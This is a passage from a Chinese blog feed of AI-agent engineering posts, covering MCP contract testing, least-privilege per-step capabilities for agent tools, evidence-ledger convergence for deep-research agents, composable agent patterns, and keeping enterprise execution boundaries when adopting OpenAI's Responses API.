<p>契约测试覆盖版本不匹配、能力缺失、分页、listChanged、timeout、取消、malformed result、未知 content type 和 Server 中途退出。只验证能连上，不足以进入生产。</p>
<p>MCP 的意义，是让上下文和工具连接从 N×M 私有适配走向共同协议。它能降低集成成本，真正的可信执行仍取决于 Host 的用户控制、企业网关的权限与审计、工具本身的状态和副作用契约。把这两层分开，才既能享受生态，又不把标准连接误当安全认证。</p>
<h2 id="对照官方规范"><a href="#对照官方规范" class="headerlink" title="对照官方规范"></a>对照官方规范</h2><ul>
<li><a href="https://www.anthropic.com/news/model-context-protocol">Anthropic 2024-11-25：Introducing the Model Context Protocol</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP 2024-11-05 Specification：架构、能力与安全原则</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/basic/lifecycle">MCP 2024-11-05 Lifecycle：initialize、版本和能力协商</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/server/tools">MCP 2024-11-05 Tools：tools&#x2F;list、tools&#x2F;call 与安全考虑</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 工具</tag>
        <tag>MCP</tag>
        <tag>连接协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 工具默认最小权限：能力要按 Run 和 Step 临时授予</title>
    <url>//2025/01/15/agent-tool-least-privilege/</url>
    <content><![CDATA[<p>Agent 接了十个工具后，最省事的做法是给运行服务一个能访问十套系统的账户，再靠 Prompt 告诉模型“只做用户允许的事”。这会把服务账户的最大权限变成每次对话的潜在权限，任何 Prompt Injection、对象误选或编排 bug 都能放大影响。</p>
<p>我希望权限按 Run 和 Step 临时收敛。当前用户、当前任务、当前步骤真正需要什么能力，就签发什么短时 capability。服务账户只是基础设施连接身份，不代表模型自动拥有它能做的所有事。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-tool-least-privilege.svg" class="lazyload" data-srcset="/images/articles/agent-tool-least-privilege.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 工具权限按 Run 和 Step 收敛"></p>
<span id="more"></span>

<h2 id="最小权限先从工具可见性开始"><a href="#最小权限先从工具可见性开始" class="headerlink" title="最小权限先从工具可见性开始"></a>最小权限先从工具可见性开始</h2><p>研究文档的 Step 只需要 search&#x2F;read，不应该向模型暴露 send、delete、deploy。生成变更计划需要 preview，不需要 execute。工具列表越小，误选和注入后的路径越少，Prompt token 也更省。</p>
<p>可见性由 orchestrator 根据 workflow node 与 policy 生成，不让模型自己请求“把管理员工具加进来”。需要新能力时，模型返回 capability request，外层根据任务定义和用户授权决定是否进入新 Step。</p>
<p>隐藏工具仍不是安全边界。攻击者可以绕过模型直调接口，因此工具服务按每次请求携带的 capability 与主体再次验证。模型看不见和后端拒绝，两层都要有。</p>
<p>MCP 2024-11-05 规范区分 resources、prompts、tools，并明确 Host 负责用户同意与控制。Server 能列出一个工具，只表示协议可发现，不表示 Host 应把它暴露给当前模型或允许调用。</p>
<h2 id="权限是三份策略的交集"><a href="#权限是三份策略的交集" class="headerlink" title="权限是三份策略的交集"></a>权限是三份策略的交集</h2><p>一次有效能力来自 <code>user permission ∩ agent/workflow policy ∩ tool/resource policy</code>。用户也许有生产发布权，但这个“只读分析 Agent”按设计没有；Agent 允许查询，目标数据域又要求特定 purpose，仍可能拒绝。</p>
<p>策略输入包括 subject、tenant、action、resource ID&#x2F;type、environment、resource state、purpose、risk、time 和 requested scope。输出包含 allow&#x2F;deny、obligations、expiry、limits 与 decision ID。</p>
<p>角色只能提供初始权限集合，具体对象和上下文用属性判断。NIST ABAC 把 subject、object、action 和 environment attributes 纳入授权，这比“用户是不是管理员”更适合多租户 Agent。</p>
<p>拒绝默认生效。缺 owner、无法解析环境、policy service 超时等不确定状态，不降级成 allow。普通只读公开信息可配置 last-known-good，生产动作与敏感数据 fail closed。</p>
<h2 id="Capability-绑定动作、对象和预算"><a href="#Capability-绑定动作、对象和预算" class="headerlink" title="Capability 绑定动作、对象和预算"></a>Capability 绑定动作、对象和预算</h2><p>短时 capability 至少包含 subject、run&#x2F;step、tool&#x2F;action、resource scope、allowed fields、constraints、expiry、max calls 和 policy version，并由可信网关签名。工具验证签名和 audience，不接受模型生成的 token 字符串。</p>
<p>对象 scope 使用稳定 IDs 或受控集合，不用 <code>project_name=*</code>。批量场景先 preview 展开具体对象清单并 hash；执行时若清单变化，需要新授权。</p>
<p>约束还包括数据量、结果行数、时间范围、网络目标与成本。一个 read capability 可以只允许查看任务摘要，不能下载原始日志；query capability 限定 catalog&#x2F;schema 与最大扫描量。</p>
<p>capability 不含长期凭据。工具网关根据它换取&#x2F;选择后端身份，token 在 expiry 或 Run 结束后撤销。即使对话记录泄露，也不能长期复用。</p>
<h2 id="写、读和元数据发现分开"><a href="#写、读和元数据发现分开" class="headerlink" title="写、读和元数据发现分开"></a>写、读和元数据发现分开</h2><p>“查看任务”包含对象是否存在、配置、日志和运行结果，敏感级别并不相同。Discover 工具只返回授权候选，Read Summary 返回有限字段，Read Full Logs 需要额外 scope。</p>
<p>写操作拆 preview 与 execute。preview 使用只读 capability，返回目标、版本、影响和 plan hash；execute capability 只有在确认&#x2F;审批后签发，并绑定 plan hash。用户取消或计划过期立即失效。</p>
<p>对于数据库，模型没有连接凭据。查询代理使用只读 role、事务只读、timeout 和行列策略。生产 DDL&#x2F;DML 不因为用户拥有数据库账号就暴露给 Agent；它们进入已有变更系统。</p>
<p>跨工具数据流也要限制。读取客户数据后调用外部搜索工具，单个工具权限都允许，但组合违反数据出域策略。Run 的 data labels 随 artifacts 传播，下一工具策略检查 input classifications。</p>
<h2 id="Delegation-不能无界继承"><a href="#Delegation-不能无界继承" class="headerlink" title="Delegation 不能无界继承"></a>Delegation 不能无界继承</h2><p>多 Agent&#x2F;worker 场景里，主 Agent 给子任务的能力必须是自身 capability 的子集，且 scope 更窄、expiry 不更长。worker 不能再委派未被允许的工具。</p>
<p>交接 manifest 写 objective、allowed tools、resource scopes、budget 和 completion criteria。子 Agent 返回 artifact，不返回可继续使用的原 capability。需要后续动作由 orchestrator 重新授权。</p>
<p>MCP Server 发起 sampling 或返回另一个 resource URI 时，Host 仍重新检查。协议中的双向能力不应变成 Server 代表用户递归扩权。</p>
<p>delegation chain 进入审计：谁根据哪个 policy 把哪份能力授予哪个 worker。发现异常可以按 capability ID 或 Server ID 撤销，不必关停整个 Agent 平台。</p>
<h2 id="审计与回归验证最小权限是否真的生效"><a href="#审计与回归验证最小权限是否真的生效" class="headerlink" title="审计与回归验证最小权限是否真的生效"></a>审计与回归验证最小权限是否真的生效</h2><p>每次工具 proposal 记录当时可见 tool set、capability request、policy decision、issued token ID、工具验证结果和 operation。只记录成功调用，看不到模型是否反复请求过界能力。</p>
<p>指标包括 exposed tools per step、granted&#x2F;denied scope、unused capabilities、permission failures、capability expiry、跨域 data-flow deny。长期未使用能力从 workflow policy 删除，不让权限只增不减。</p>
<p>安全回归用例直接调用工具接口，伪造 subject、修改 resource、扩大时间范围、复用过期 token、跨 Run 使用、确认后换参、子 Agent 再委派。不能只从聊天入口测试。</p>
<p>最小权限不会让 Agent 永不犯错，但能把一次错误限制在当前步骤和对象内。工具越强、运行越自主，这种临时、可撤销、可审计的 capability 越重要。把长期服务权限直接交给模型，是方便一时，把整个系统的 blast radius 留给未来事故。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP 2024-11-05 Specification：用户同意、数据隐私与工具安全原则</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/server/tools">MCP 2024-11-05 Tools：模型控制工具与人类可拒绝调用</a></li>
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-162/final">NIST SP 800-162：Attribute Based Access Control</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html">OWASP Authorization Cheat Sheet：最小权限、deny by default 与逐请求校验</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 工具</tag>
        <tag>MCP</tag>
        <tag>最小权限</tag>
      </tags>
  </entry>
  <entry>
    <title>Deep Research 的难点不是搜得多，而是证据什么时候算收敛</title>
    <url>//2025/02/24/deep-research-evidence-convergence/</url>
    <content><![CDATA[<p>OpenAI 2 月 2 日发布 deep research 后，长时间自主搜索和综合大量来源的研究 Agent 进入产品视野。连续搜索几十次只是执行表象，真正困难的是回答两个问题：核心结论是否已有足够证据，继续搜索是否还会改变结论。</p>
<p>我把研究过程组织成 Claim-Evidence Ledger。先把研究问题拆成可核查主张和所需证据类型，每轮搜索填补覆盖缺口、查找反例或验证来源；达到预先定义的收敛条件才结束，不以网页数、token 或运行时长作为完成标准。</p>
<p class="article-diagram-scroll"><img src="/images/articles/deep-research-evidence-convergence.svg" class="lazyload" data-srcset="/images/articles/deep-research-evidence-convergence.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Deep Research 的证据收敛循环"></p>
<span id="more"></span>

<h2 id="研究开始前先冻结边界"><a href="#研究开始前先冻结边界" class="headerlink" title="研究开始前先冻结边界"></a>研究开始前先冻结边界</h2><p>“分析湖仓趋势”没有可结束的边界。需要定义时间范围、地区&#x2F;行业、术语、比较维度、可接受来源、交付深度和截止时间。范围不清时先向用户确认，而不是用搜索结果反向猜问题。</p>
<p>问题拆成主 claims 与子 claims。例如比较两种架构，不只列优缺点，还需要成本、性能、生态成熟度、运维约束和适用场景。每个 claim 标风险和所需来源：官方规格、源码、论文、财报、统计数据或一手访谈。</p>
<p>事实、分析和建议分开。事实要求来源直接支持；分析可以由多条事实推导，但保留推理链；建议还要绑定用户约束。把三者混在一段流畅文本里，读者无法知道哪部分是材料、哪部分是 Agent 判断。</p>
<p>研究计划是可修改 artifact。新证据发现术语有歧义，可以扩展问题树，但每次 scope change 记录原因和预算影响，不能无限长出新分支。</p>
<h2 id="Search-Ledger-防止重复浏览"><a href="#Search-Ledger-防止重复浏览" class="headerlink" title="Search Ledger 防止重复浏览"></a>Search Ledger 防止重复浏览</h2><p>每次查询记录 query、intent、source filters、结果 IDs、选择&#x2F;丢弃原因和时间。不同措辞反复搜到同一批页面时，系统知道边际收益已经下降，而不是继续消耗。</p>
<p>来源按权威性与独立性分类。四篇转载同一新闻稿不是四个独立证据；两个 benchmark 若共享数据集和作者，也不能完全当独立验证。provenance graph 把引用&#x2F;转载关系连起来。</p>
<p>时间敏感结论优先找最新一手来源，同时保留历史版本。网页当前内容可能更新，证据保存 URL、标题、发布日期、抓取时间、内容 hash 和具体 span。无法保存快照时标可复现性限制。</p>
<p>搜索结果摘要不能直接成为证据。必须打开来源，定位支持&#x2F;反驳 claim 的原文&#x2F;数据；搜索引擎 snippet 截断且可能过期，只用于候选发现。</p>
<h2 id="每条-Claim-都有证据状态"><a href="#每条-Claim-都有证据状态" class="headerlink" title="每条 Claim 都有证据状态"></a>每条 Claim 都有证据状态</h2><p>Ledger 对 claim 记录 supports、contradicts、partial、uncertain。证据带来源等级、独立性、时间、适用范围和提取者。一个 claim 可以被两条证据支持，同时被一条高权威来源反驳。</p>
<p>数值核对单位、分母、样本与统计时间。两个来源写“增长 20%”，一个是环比、一个是同比，不能合并。表格&#x2F;图表中的数字保留行列头和计算公式，不只摘最终值。</p>
<p>二手来源可用于发现线索，核心 claim 尽量回到原始论文、官方文档或数据集。无法找到一手材料时，报告明确说“依据二手报道”，降低确信度。</p>
<p>Agent 生成的推断也进入 ledger，但 evidence type 标 inference，并列出 premises。用户能区分“来源明确写了”与“根据 A&#x2F;B 推断”。</p>
<h2 id="冲突不是噪声，是研究结果"><a href="#冲突不是噪声，是研究结果" class="headerlink" title="冲突不是噪声，是研究结果"></a>冲突不是噪声，是研究结果</h2><p>多来源研究必然遇到冲突。不能让模型按多数投票或选择最顺的叙事。先检查定义、时间、样本、环境和版本是否可比，很多冲突其实是范围不同。</p>
<p>真正冲突时比较来源权威、方法透明度、样本和独立性，并在报告展示两边证据。若无法裁决，结论保持 uncertain，说明需要什么新证据才能推进。</p>
<p>反例搜索是固定步骤。初步结论形成后，主动构造反向查询，找失败案例、限制、不同基准和批评。只沿支持方向搜索，会让 Agent 很快“收敛”到最初假设。</p>
<p>来源多样性要看方法与利益相关方，域名数量本身没有意义。官方规格说明设计意图，用户事故说明运行现实，论文 benchmark 说明受控实验，各自回答不同问题。</p>
<h2 id="收敛条件要能计算"><a href="#收敛条件要能计算" class="headerlink" title="收敛条件要能计算"></a>收敛条件要能计算</h2><p>我会为研究设以下停止条件：所有 high-risk claims 有充分证据；关键 claim 至少有两个独立来源，或一个权威一手来源；冲突已解释或显式保留；最近 N 次搜索没有新增高价值 evidence；预算&#x2F;deadline 未超。</p>
<p>“两个独立来源”不是硬性真理，某些规格只有唯一官方来源。规则按 evidence requirement 配置。关键是要求在研究前可见，不能写到最后再用现有材料定义“够了”。</p>
<p>边际收益用新增 claim coverage、提升 confidence、发现重要 contradiction 衡量。又找到十篇重复文章，收益接近零；找到一个能推翻核心假设的源码提交，收益很高。</p>
<p>预算到期但未收敛，状态是 incomplete，不把停止包装成完成。报告列未覆盖 claims、冲突和下一步搜索建议。</p>
<h2 id="报告必须能从结论回到证据"><a href="#报告必须能从结论回到证据" class="headerlink" title="报告必须能从结论回到证据"></a>报告必须能从结论回到证据</h2><p>最终报告的关键句绑定 evidence IDs，引用靠近 claim，显示来源日期与适用范围。参考文献列表很长却无法对应结论，不算可复核。</p>
<p>方法附录记录查询范围、来源过滤、检索截止、排除标准、模型&#x2F;工具版本与局限。使用 paywall、动态页面或无法复现的数据也说明。</p>
<p>生成后做 claim-evidence verification：引用是否真的支持，数值是否一致，限定条件是否保留，冲突是否被遗漏。高风险结论人工抽查，不能让同一个模型既写又无条件自批。</p>
<p>研究 trace 保存计划变化、搜索 ledger、证据选择与最终 claims。用户指出错误时，能定位是源材料错、提取错、推断错还是过期，不把整份报告重写后失去现场。</p>
<p>Deep Research 的价值不在于产生更长报告，而在于把分散来源组织成一条可以检查的论证链。搜索是手段，证据覆盖、独立验证、冲突处理和清晰停止条件，才决定研究是否真正收敛。</p>
<h2 id="对照官方资料与论文"><a href="#对照官方资料与论文" class="headerlink" title="对照官方资料与论文"></a>对照官方资料与论文</h2><ul>
<li><a href="https://openai.com/index/introducing-deep-research/">OpenAI 2025-02-02：Introducing deep research</a></li>
<li><a href="https://arxiv.org/abs/2009.02252">KILT：知识密集任务中答案与 provenance 联合评测</a></li>
<li><a href="https://arxiv.org/abs/1803.05355">FEVER：Claim、Evidence Retrieval 与 Verification</a></li>
<li><a href="https://arxiv.org/abs/2104.08663">BEIR：跨领域检索基准与评测</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Deep Research</tag>
        <tag>证据收敛</tag>
        <tag>研究 Agent</tag>
      </tags>
  </entry>
  <entry>
    <title>读完 Building Effective Agents：我更认同用小模式组合，而不是先选大框架</title>
    <url>//2024/12/23/effective-agent-composable-patterns/</url>
    <content><![CDATA[<p>Anthropic 12 月 19 日发布《Building effective agents》，其中一句和我的工程经验很一致：成功实现更常使用简单、可组合的模式，而不是复杂框架。Agent 架构不是功能越多越好，关键是任务到底需要哪种自由度。</p>
<p>我不会拿一个通用 Agent loop 处理所有问题。路径已知就做 chaining，类别明确就 routing，子任务独立就 parallelization，拆分动态才用 orchestrator-workers，需要反复改进就 evaluator-optimizer，真正开放探索才进入 autonomous agent。</p>
<p class="article-diagram-scroll"><img src="/images/articles/effective-agent-composable-patterns.svg" class="lazyload" data-srcset="/images/articles/effective-agent-composable-patterns.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="用小模式组合 Agent，而不是先上复杂框架"></p>
<span id="more"></span>

<h2 id="先画任务画像，再选模式"><a href="#先画任务画像，再选模式" class="headerlink" title="先画任务画像，再选模式"></a>先画任务画像，再选模式</h2><p>选择前我会问：成功标准能否写成断言，步骤是否可预先枚举，子任务是否独立，外部动作是否有副作用，中间结果是否需要人确认，失败能否重试或补偿。</p>
<p>数据平台里“生成 SQL 并验证”路径很稳定：理解口径、取 schema、生成、parser&#x2F;catalog&#x2F;plan、受控执行、结果断言。它适合 Workflow chaining，不需要模型每次重新发明步骤。</p>
<p>“调查一个未知代码库中的故障”可能需要根据中间发现选择文件和工具，更适合 Agent；但生产操作仍从 Agent 中拿出来，交给固定工具契约和确认节点。</p>
<p>任务画像进入设计文档和评测桶。不能因为框架提供 multi-agent 按钮，就把每个任务拆成多个角色。通信、重复上下文和结果合并都有成本。</p>
<h2 id="Prompt-Chaining-用-Gate-连接"><a href="#Prompt-Chaining-用-Gate-连接" class="headerlink" title="Prompt Chaining 用 Gate 连接"></a>Prompt Chaining 用 Gate 连接</h2><p>Chaining 把复杂任务拆成固定步骤，每步模型输入更小，输出更容易验证。关键不是“多调几次模型”，而是步骤之间有 gate。</p>
<p>例如先提取问题中的指标&#x2F;时间&#x2F;维度，schema 验证通过再检索 Catalog；SQL 生成后必须过真实引擎验证，才进入解释。前一步不确定时追问，不把错误结构继续放大。</p>
<p>每步固定 Bundle、输入输出 artifact 和 attempts。失败可以从 gate 恢复，改 extractor 不必重跑已经固定的源数据。总 deadline 和成本由外层 Workflow 管理。</p>
<p>链太长也会造成信息损失。下游只拿结构化结论，同时保留 evidence refs，需要时回看原始材料；不要层层摘要直到事实条件消失。</p>
<h2 id="Routing-先做硬约束"><a href="#Routing-先做硬约束" class="headerlink" title="Routing 先做硬约束"></a>Routing 先做硬约束</h2><p>Routing 适合按问题类型、风险或模型能力选择专用路径。先用规则&#x2F;轻模型分类，再路由到 SQL、知识问答、运维诊断或人工。</p>
<p>硬约束优先：用户权限、数据域、工具需求、上下文长度、语言和环境。满足后才比较模型质量、延迟与成本。分类低置信时走通用安全路径或追问，不把一个错误类别直接带进有副作用的工具链。</p>
<p>路由结果带 reason、policy version 和候选。线上反馈按任务桶更新，不能只看全站平均成功率。fallback 仍必须满足原能力和数据边界。</p>
<p>这类路由往往比“一个万能 Prompt”更容易维护，因为每条路径的上下文、工具和评测都更窄。</p>
<h2 id="Parallelization-只并行真正独立的工作"><a href="#Parallelization-只并行真正独立的工作" class="headerlink" title="Parallelization 只并行真正独立的工作"></a>Parallelization 只并行真正独立的工作</h2><p>多个文档分别提取事实、多个候选 SQL 各自 EXPLAIN、代码库不同模块检索，可以并行。并行前冻结共享输入，子任务有独立 ID、deadline 和结果 schema。</p>
<p>聚合器不能只把所有文本拼接。它按 object&#x2F;claim&#x2F;evidence 去重、处理冲突，等待策略明确 all&#x2F;quorum&#x2F;first-valid。高风险事实通常要 all required evidence，普通搜索可接受 top valid。</p>
<p>并行会放大限流和成本。全局并发、token 与工具配额由 runtime 控制，子任务取消能传播。一个分支失败时，结果标 partial，不让聚合模型假装全部完成。</p>
<p>Voting 是 parallelization 的一种，但多个模型一致不等于事实正确。它们可能共享同一错误上下文。最终仍看外部 evidence 和确定断言。</p>
<h2 id="Orchestrator-Workers-需要交接契约"><a href="#Orchestrator-Workers-需要交接契约" class="headerlink" title="Orchestrator-Workers 需要交接契约"></a>Orchestrator-Workers 需要交接契约</h2><p>任务无法预先知道子任务数量时，orchestrator 动态拆分，workers 执行。拆分结果必须结构化：task ID、objective、allowed tools、input artifacts、expected output、deadline、budget 和 completion criteria。</p>
<p>worker 不能看到整个主 Agent 的所有工具和秘密，只获得子任务最小 scope。输出带 evidence 和 status，orchestrator 不根据“我已完成”的自然语言直接关闭任务。</p>
<p>重复&#x2F;重叠子任务通过 normalized objective 和 resource scope 检测。worker 失败可重试或重新分配，但 side-effect operation 先对账，不能重复执行。</p>
<p>共享状态由持久化 task board&#x2F;artifact store 管理，不靠模型互相转述。交接越显式，multi-agent 越容易观测；否则只是把一个不可解释 loop 拆成多个。</p>
<h2 id="Evaluator-Optimizer-要有限迭代"><a href="#Evaluator-Optimizer-要有限迭代" class="headerlink" title="Evaluator-Optimizer 要有限迭代"></a>Evaluator-Optimizer 要有限迭代</h2><p>适合有明确质量标准、一次生成难达标的任务，例如 SQL 优化、报告证据完整性、代码测试修复。generator 提出候选，evaluator 返回结构化 violations 与 evidence，optimizer 针对问题改动。</p>
<p>evaluator 尽量使用真实 parser、tests、schema、policy 和 claim-evidence 检查。另一个模型可以做语言质量评审，不能替代引擎和权限事实。</p>
<p>循环有 max iterations、deadline 和 no-progress detection。连续两轮相同 violation 或结果未变化就停止，转人工。每轮保存 diff，避免模型在修 A 时又退化 B 而总分碰巧不变。</p>
<p>最终发布必须通过守门断言，不是 evaluator 给出“看起来很好”。</p>
<h2 id="Autonomous-Agent-是最后一种模式"><a href="#Autonomous-Agent-是最后一种模式" class="headerlink" title="Autonomous Agent 是最后一种模式"></a>Autonomous Agent 是最后一种模式</h2><p>Agent 适合开放任务和可信环境中的灵活探索。它需要清晰目标、环境反馈和停止条件，工具定义质量直接决定表现。Anthropic 的文章也强调从简单方案开始，只在需要时增加复杂度。</p>
<p>开放 loop 仍受状态机、权限、预算、sandbox、证据和回放控制。模型决定下一步，runtime 决定这个动作是否允许、是否已执行、何时停止。</p>
<p>生产系统常是混合结构：外层 Workflow 负责阶段和审批，某个研究节点内部运行 Agent，结果通过 gate 后回到固定流程。无需在“工作流还是 Agent”之间二选一。</p>
<p>框架是否好用，最后看它有没有隐藏状态和协议。能否查看每一步输入输出、固定版本、替换模型、模拟工具、取消恢复和回放，比提供多少预置角色更重要。</p>
<p>简单模式不是功能少，而是每一层复杂度有具体理由。先用任务画像选择最小模式，再把状态、证据、预算和权限放进统一运行底座，Agent 系统才容易验证，也能随着业务需要逐步增加自由度。</p>
<h2 id="对照官方文章与论文"><a href="#对照官方文章与论文" class="headerlink" title="对照官方文章与论文"></a>对照官方文章与论文</h2><ul>
<li><a href="https://www.anthropic.com/research/building-effective-agents">Anthropic 2024-12-19：Building effective agents</a></li>
<li><a href="https://arxiv.org/abs/2210.03629">ReAct：Reasoning 与 Acting 交错模式</a></li>
<li><a href="https://arxiv.org/abs/2305.04091">Plan-and-Solve Prompting：先规划再执行</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：模型与外部工具的结构化连接</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 架构</tag>
        <tag>Composable Patterns</tag>
        <tag>Workflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Responses API 统一了模型与工具，但企业执行边界仍要自己守</title>
    <url>//2025/03/18/responses-api-execution-boundary/</url>
    <content><![CDATA[<p>OpenAI 3 月 11 日发布 Responses API，把 Chat Completions 的简洁接口与工具使用能力放进新的 API primitive，并提供 web search、file search、computer use 等内置工具。统一 item 结构和流式事件会减少很多自建编排代码。</p>
<p>但供应商帮我们统一模型与内置工具，不等于企业内部动作也能直接托管。用户身份、对象权限、生产状态、审批、幂等和回滚仍属于企业执行域。我会把 provider response 和 business operation 分成两套身份与状态，再在 Run 最终化阶段汇合。</p>
<p class="article-diagram-scroll"><img src="/images/articles/responses-api-execution-boundary.svg" class="lazyload" data-srcset="/images/articles/responses-api-execution-boundary.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Responses API 接入后的两层执行边界"></p>
<span id="more"></span>

<h2 id="Response-不是企业-Run-的唯一身份"><a href="#Response-不是企业-Run-的唯一身份" class="headerlink" title="Response 不是企业 Run 的唯一身份"></a>Response 不是企业 Run 的唯一身份</h2><p>一次用户 Run 可能调用多个 Responses，遇到网络&#x2F;模型失败还会产生 attempts；一个 Response 内也可能包含多个 output items 和内置工具步骤。企业 run_id 是最外层身份，response_id&#x2F;provider request ID 作为 attempts&#x2F;artifacts 关联。</p>
<p>反过来，不能只存 run_id 丢掉 response_id。供应商侧排障、usage、stored response 和流事件都要用原生身份查。trace 建立 <code>run -&gt; response attempt -&gt; output item/tool event</code> 层级。</p>
<p>Run 固定用户、租户、Bundle、policy、deadline 和数据分类。请求发送前记录哪些数据将进入供应商、是否允许 store、保留策略和实际模型 snapshot。API 提供存储能力不代表所有业务默认开启。</p>
<p>重试创建新 response attempt，但 enterprise tool operations 不跟着重建。下一 attempt 复用已验证工具结果或查询 operation state，防止模型重试造成重复动作。</p>
<h2 id="Built-in-Tool-与-Function-Tool-风险不同"><a href="#Built-in-Tool-与-Function-Tool-风险不同" class="headerlink" title="Built-in Tool 与 Function Tool 风险不同"></a>Built-in Tool 与 Function Tool 风险不同</h2><p>web&#x2F;file search、computer use 等内置工具由供应商协议管理，function call 则通常需要应用执行企业工具。两类都要观测，但授权和责任不同。</p>
<p>内置 web search 涉及查询文本出域、来源可信度和引用；file search 涉及 vector store&#x2F;文件 ACL 与保留；computer use 会产生 UI 操作和真实副作用。官方发布说明也把 computer use 标为 research preview，并建议人类监督。企业不能因为它叫 built-in 就跳过风险评估。</p>
<p>Function output item 只是一份 proposal。应用校验 function name、arguments、对象、权限、状态与确认，执行后得到 business operation ID，再把有限结果交回模型。</p>
<p>每个 tool type 在 capability registry 声明 execution_owner：provider 或 enterprise。Run finalizer 才知道去哪查终态、谁负责取消、如何对账成本和副作用。</p>
<h2 id="Item-流需要按协议归并"><a href="#Item-流需要按协议归并" class="headerlink" title="Item 流需要按协议归并"></a>Item 流需要按协议归并</h2><p>Responses API 的 item-based design 比纯文本更适合表达多种输出，但客户端仍不能假设每个流事件都是完整 item。adapter 保存原生 event type、sequence&#x2F;IDs 与 payload，再转成统一事件。</p>
<p>text delta、item created&#x2F;completed、tool call、usage、response completed&#x2F;failed 等有明确状态关系。只有 response 终态与所有必要 item 完整，attempt 才 completed；HTTP 200 或连接 EOF 不够。</p>
<p>未知 event type 不丢弃，标 protocol drift 并保留 native。SDK 提供 <code>output_text</code> 之类 helper 很方便，审计和工具运行时仍要读结构化 output items，不能只取拼接文本。</p>
<p>流中 function arguments 未完成前不执行。终态后再做 JSON&#x2F;schema validation，生成 tool_call_id 与 enterprise operation 的映射。工具结果回填也带对应 call ID，不能靠数组位置对齐。</p>
<h2 id="企业执行网关保持原边界"><a href="#企业执行网关保持原边界" class="headerlink" title="企业执行网关保持原边界"></a>企业执行网关保持原边界</h2><p>网关收到 function proposal 后，先 resolve stable resource ID，按真实 user subject 调 policy，必要时生成 preview&#x2F;approval，再用 idempotency key 创建 operation。模型和供应商都不拿生产凭据。</p>
<p>工具后端再次鉴权，并检查 expected resource version。供应商侧 conversation state 只能保存对话&#x2F;工具结果，不替代企业 operation database；哪次动作是否已执行，以后者为准。</p>
<p>超时后不把错误字符串直接交模型重试。先查询 operation：已成功返回现有 result，确认未执行才重投，未知则等待&#x2F;人工。provider response 重试与 business operation 重试是两个策略。</p>
<p>结果只返回模型需要的 fields、status、error code 和 evidence ref。内部堆栈、凭据、完整日志不进入 provider context，数据最小化在工具层落实。</p>
<h2 id="最终成功要合并两层证据"><a href="#最终成功要合并两层证据" class="headerlink" title="最终成功要合并两层证据"></a>最终成功要合并两层证据</h2><p>Response completed 可能生成了漂亮答案，但企业 operation 仍 running；operation succeeded，最终 response 又可能断流。Run 状态必须同时检查任务 completion criteria。</p>
<p>例如“重跑失败任务并告诉我结果”：至少需要模型选择正确实例、policy&#x2F;confirmation 通过、rerun operation 业务验证成功、最终答案引用新实例 ID&#x2F;status。少一项都不应显示 complete。</p>
<p>内置 search 报告还需 claim-citation 验证；computer use 要从目标系统回读状态，不能只相信截图或模型说“已点击”。provider tool success 与 business effect 分开。</p>
<p>finalization 保存 response items、enterprise operations、evidence、usage 和 warnings。客户端发送失败时可重读最终 artifact，不重跑模型与工具。</p>
<h2 id="网关适配要保留退出路径"><a href="#网关适配要保留退出路径" class="headerlink" title="网关适配要保留退出路径"></a>网关适配要保留退出路径</h2><p>Responses API 是新的推荐 primitive，但业务层不应直接依赖供应商 item 类型完成授权和状态。内部定义 provider-neutral Run&#x2F;Attempt&#x2F;Tool Proposal&#x2F;Operation&#x2F;Evidence，adapter 负责映射。</p>
<p>不是为了最低公分母。Responses 独有能力保留 native extension，capability matrix 显式声明；业务使用前绑定 provider feature，并准备缺失时的失败&#x2F;降级，不假装所有模型相同。</p>
<p>迁移先影子运行：同一输入在旧 Chat Completions&#x2F;现有编排与 Responses adapter 下比较文本、tool path、finish、usage、流式事件和错误。固定工具 mocks，确认协议转换后再接真实 operation。</p>
<p>官方接口简化了模型侧编排，企业运行时应因此变薄，但不应消失。谁授权、谁执行、谁确认最终业务状态，是跨供应商都要保留的边界。把 Response 与 Operation 分开建模，才能既使用新 API 的工具能力，又不把生产控制权交给模型协议。</p>
<h2 id="对照官方资料与规范"><a href="#对照官方资料与规范" class="headerlink" title="对照官方资料与规范"></a>对照官方资料与规范</h2><ul>
<li><a href="https://openai.com/index/new-tools-for-building-agents/">OpenAI 2025-03-11：New tools for building agents 与 Responses API</a></li>
<li><a href="https://platform.openai.com/docs/api-reference/responses">OpenAI Responses API Reference</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP 2024-11-05 Specification：工具协议不替代用户授权与控制</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨供应商与企业服务关联一次 Run</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Responses API</tag>
        <tag>Agent 运行时</tag>
